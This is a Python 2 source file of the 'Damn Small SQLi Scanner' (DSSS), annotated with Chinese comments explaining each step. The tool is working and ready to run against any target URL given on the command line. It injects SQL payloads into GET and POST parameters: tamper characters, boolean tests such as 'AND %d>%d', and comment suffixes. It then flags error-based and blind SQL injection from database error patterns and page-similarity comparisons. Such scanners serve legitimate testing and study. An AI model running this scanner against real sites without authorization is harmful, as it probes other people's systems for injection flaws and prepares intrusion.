 # -*- coding: UTF-8 -*- 
 '''
 manning代码详解版，感谢作者分享
 '''
import difflib
import time
import httplib
import itertools
import optparse
import random
import re
import urllib
import urllib2
import urlparse

NAME    = "Damn Small SQLi Scanner (DSSS) < 100 LoC (Lines of Code)"
VERSION = "0.2m"
AUTHOR  = "Miroslav Stampar (@stamparm)"
LICENSE = "Public domain (FREE)"

PREFIXES = (" ", ") ", "' ", "') ", "\"", "%%' ", "%%') ")              # prefix values used for building testing blind payloads
SUFFIXES = ("", "-- -", "#", "%%00", "%%16")                            # suffix values used for building testing blind payloads
TAMPER_SQL_CHAR_POOL = ('(', ')', '\'', '"')                            # characters used for SQL tampering/poisoning of parameter values
BOOLEAN_TESTS = ("AND %d>%d", "OR NOT (%d>%d)")                         # boolean tests used for building testing blind payloads
COOKIE, UA, REFERER = "Cookie", "User-Agent", "Referer"                 # optional HTTP header names
GET, POST = "GET", "POST"                                               # enumerator-like values used for marking current phase
TEXT, HTTPCODE, TITLE, HTML = xrange(4)                                 # enumerator-like values used for marking content type
FUZZY_THRESHOLD = 0.95                                                  # ratio value in range (0,1) used for distinguishing True from False responses
TIMEOUT = 30                                                            # connection timeout in seconds

DBMS_ERRORS = {
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", \
        r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
    "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
    "Oracle": (r"ORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*")
}

_headers = {}                                                           # used for storing dictionary with optional header values

def _retrieve_content(url, data=None):
    retval = {HTTPCODE: 200}     #httplib.OK == 200
    try:
        #req = urllib2.Request("".join(url[_].replace(' ', "%20") if _ > url.find('?') else url[_] for _ in xrange(len(url))), data, _headers)
        tmp = ''
        for i in xrange(len(url)):
            if i > url.find('?'):
                tmp += url[i].replace(' ','%20')
            else:
                tmp += url[i]
        req = urllib2.Request(tmp, data, _headers)
        retval[HTML] = urllib2.urlopen(req, timeout=TIMEOUT).read()
        '''
        retval字典中，新建一个HTML的key value是html页面的内容string
        '''
    except Exception, ex:
        retval[HTTPCODE] = getattr(ex, "code", None)    
        '''
        #如果ex有属性，则返回code，否则返回None
        '''
        if hasattr(ex,"read"):
            retval[HTML] = ex.read()
        else:
            retval[HTML] = getattr(ex, "msg", "")
    '''
    以上这段代码就是建立一个字典，字典有两个key，分别是HTML,HTTPCODE
    '''    

    match = re.search(r"<title>(?P<result>[^<]+)</title>", retval[HTML], re.I)
    '''
    以上这段代码，re中正常的search匹配，第三个参数为re.I,意思是匹配模式为忽略大小写
    PS:
    I(re.IGNORECASE): 忽略大小写
    M(MULTILINE): 多行模式，改变'^'和'$'的行为
    S(DOTALL): 点任意匹配模式，改变'.'的行为
    L(LOCALE): 使预定字符类 \w \W \b \B \s \S 取决于当前区域设定
    U(UNICODE): 使预定字符类 \w \W \b \B \s \S \d \D 取决于unicode定义的字符属性
    X(VERBOSE): 详细模式。这个模式下正则表达式可以是多行，忽略空白字符，并可以加入注释。
    '''
    #retval[TITLE] = match.group("result") if match and "result" in match.groupdict() else None
    if match and "result" in match.groupdict():
        retval[TITLE] = match.group("result")
    else:
        retval[TITLE] = None

    retval[TEXT] = re.sub(r"(?si)<script.+?</script>|<!--.+?-->|<style.+?</style>|<[^>]+>|\s+", " ", retval[HTML])
    return retval
    '''
    返回一个字典，字典中有4个key 分别是 HTML,HTTPCODE,TITLE,TEXT
    '''

def scan_page(url, data=None):
    retval, usable = False, False
    #url, data = re.sub(r"=(&|\Z)", "=1\g<1>", url) if url else url, re.sub(r"=(&|\Z)", "=1\g<1>", data) if data else data
    url = re.sub(r"=(&|\Z)", "=1\g<1>", url) if url else url
    data = re.sub(r"=(&|\Z)", "=1\g<1>", data) if data else data
    try:
        for phase in (GET, POST):
            original = None
            #current = url if phase is GET else (data or "")
            if phase is GET:
                current = url
            else:
                current = (data or "")

            for match in re.finditer(r"((\A|[?&])(?P<parameter>\w+)=)(?P<value>[^&]+)", current):
                vulnerable, usable = False, True
                print "* scanning %s parameter '%s'" % (phase, match.group("parameter"))
                randomtmp = "".join(random.sample(TAMPER_SQL_CHAR_POOL, len(TAMPER_SQL_CHAR_POOL)))
                tampered = current.replace(match.group(0), "%s%s" % (match.group(0), urllib.quote(randomtmp)))
                '''
                把match.group(0)替换成"%s%s" % (match.group(0), urllib.quote(randomtmp))
                '''
                content = _retrieve_content(tampered, data) if phase is GET else _retrieve_content(url, tampered)
                for (dbms, regex) in ((dbms, regex) for dbms in DBMS_ERRORS for regex in DBMS_ERRORS[dbms]):
                    if not vulnerable and re.search(regex, content[HTML], re.I):
                        print " (i) %s parameter '%s' could be error SQLi vulnerable (%s)" % (phase, match.group("parameter"), dbms)
                        retval = vulnerable = True
                '''
                (dbms, regex) for dbms in DBMS_ERRORS for regex in DBMS_ERRORS[dbms]
                是一个生成器
                生成器的长度是len（dbms_errors）*len（DBMS_ERRORS[dbms]）
                循环取这两个值
                '''
                vulnerable = False
                if original == None:
                    print time.ctime()
                original = original or (_retrieve_content(current, data) if phase is GET else _retrieve_content(url, current))
                '''
                上面这段代码，表示如果当original为None，original 为or后面的内容，否则为or前面的内容
                a = None
                a = a or 1
                print a
                -----------
                1
                '''
                randint = random.randint(1, 255)
                tmp = itertools.product(PREFIXES, BOOLEAN_TESTS, SUFFIXES)
                for prefix, boolean, suffix in tmp:
                    '''
                     itertools.product 函数返回包含3个序列的笛卡尔乘积的迭代器
                    '''
                    if not vulnerable:
                        template = "%s%s%s" % (prefix, boolean, suffix)
                        payloads = dict((_, current.replace(match.group(0), "%s%s" % (match.group(0), urllib.quote(template % \
                                                (randint + 1 if _ else randint, randint), safe='%')))) for _ in (True, False))
                        #print payloads
                        '''
                        返回一个字典，字典有2个key，一个是预期为True的url，一个是预期为False的url
                        '''
                        contents = dict((_, _retrieve_content(payloads[_], data) if phase is GET else _retrieve_content(url, payloads[_])) for _ in (False, True))
                        '''
                        返回一个字典，字典有2个key
                        一个是预期为True的_retrieve_content返回的字典数据结构
                        一个是预期为False的_retrieve_content返回的字典数据结构
                        '''
                        if all(_[HTTPCODE] for _ in (original, contents[True], contents[False])) and\
                                     (any(original[_] == contents[True][_] != contents[False][_] for _ in (HTTPCODE, TITLE))):
                            vulnerable = True
                        '''
                        if a and b:
                        a为：
                            如果原始网页的httpcode
                            负载了正确判断payload的 httpcode 
                            负载了错误判断payload的 httpcode
                            这三个httpcode组成的list，如果没有空元素或者0元素，
                            则返回true
                        b为：
                            只要 原始网页的httpcode 和 负载了正确判断payload的 httpcode 相等
                            且 不等于 负载了错误判断payload的 httpcode 
                            或者
                            原始网页的title 等于 负载了正确判断payload的 title 
                            且 不等于 负载了错误判断payload的 title
                            就返回 True
                        '''
                        else:
                            ratios = dict((_, difflib.SequenceMatcher(None, original[TEXT], contents[_][TEXT]).quick_ratio()) for _ in (True, False))
                            vulnerable = all(ratios.values()) and ratios[True] > FUZZY_THRESHOLD and ratios[False] < FUZZY_THRESHOLD
                            '''
                            difflib.SequenceMatcher(None,a,b)
                            返回一个字典，字典有2个key，True 和 False
                            quick_ratio返回difflib.SequenceMatcher对象的一个值，类似页面相似度的值
                            原始页面和正确判断页面的 比较值 和 原始页面和 错误判断页面的比较值
                            如果原始页面和正确判断页面的 比较值 》 0.95 
                            并且  原始页面和 错误判断页面的比较值 《 0.95
                            则判断为存在sql注入
                            '''
                        if vulnerable:
                            print " (i) %s parameter '%s' appears to be blind SQLi vulnerable" % (phase, match.group("parameter"))
                            retval = True
        if not usable:
            print " (x) no usable GET/POST parameters found"
    except KeyboardInterrupt:
        print "\r (x) Ctrl-C pressed"
    return retval

def init_options(proxy=None, cookie=None, ua=None, referer=None):
    global _headers
    _headers = dict(filter(lambda _: _[1], ((COOKIE, cookie), (UA, ua or NAME), (REFERER, referer))))
    urllib2.install_opener(urllib2.build_opener(urllib2.ProxyHandler({'http': proxy})) if proxy else None)

if __name__ == "__main__":
    print "%s #v%s\n by: %s\n" % (NAME, VERSION, AUTHOR)
    parser = optparse.OptionParser(version=VERSION)
    parser.add_option("-u", "--url", dest="url", help="Target URL (e.g. \"http://www.target.com/page.php?id=1\")")
    parser.add_option("--data", dest="data", help="POST data (e.g. \"query=test\")")
    parser.add_option("--cookie", dest="cookie", help="HTTP Cookie header value")
    parser.add_option("--user-agent", dest="ua", help="HTTP User-Agent header value")
    parser.add_option("--referer", dest="referer", help="HTTP Referer header value")
    parser.add_option("--proxy", dest="proxy", help="HTTP proxy address (e.g. \"http://127.0.0.1:8080\")")
    options, _ = parser.parse_args()
    if options.url:
        init_options(options.proxy, options.cookie, options.ua, options.referer)
        result = scan_page(options.url if options.url.startswith("http") else "http://%s" % options.url, options.data)
        print "\nscan results: %s vulnerabilities found" % ("possible" if result else "no")
    else:
        parser.print_help()
